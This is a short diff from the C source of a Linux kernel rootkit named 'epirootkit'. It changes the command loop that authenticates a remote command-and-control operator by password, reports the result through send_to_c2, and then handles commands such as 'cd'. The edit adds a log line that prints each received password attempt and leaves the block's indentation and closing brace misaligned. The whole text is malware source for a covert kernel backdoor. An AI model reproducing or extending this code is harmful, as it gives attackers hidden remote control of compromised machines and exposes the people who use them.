@@ -144,16 +144,17 @@ static int command_loop(void *data) {
         decrypted[input_len] = '\0';
 
         if (!authenticated) {
-            if (strcmp(decrypted, config.password) == 0) {
-                authenticated = 1;
-                send_to_c2("AUTH OK\n", 8);
-                printk(KERN_INFO "epirootkit: Authentication successful\n");
-            } else {
-                send_to_c2("AUTH FAIL\n", 10);
-                printk(KERN_WARNING "epirootkit: Authentication failed, received: '%s'\n", decrypted);
-            }
-            continue;
-        }
+    		printk(KERN_INFO "epirootkit: Received auth attempt: %s\n", decrypted);
+    		if (strcmp(decrypted, config.password) == 0) {
+       			authenticated = 1;
+        		send_to_c2("AUTH OK\n", 8);
+        		printk(KERN_INFO "epirootkit: Authentication successful\n");
+    		} else {
+        		send_to_c2("AUTH FAIL\n", 10);
+        		printk(KERN_WARNING "epirootkit: Authentication failed, received: '%s'\n", decrypted);
+    		}
+    		continue;
+}
 
         if (strncmp(decrypted, "cd ", 3) == 0) {
             const char *path = decrypted + 3;
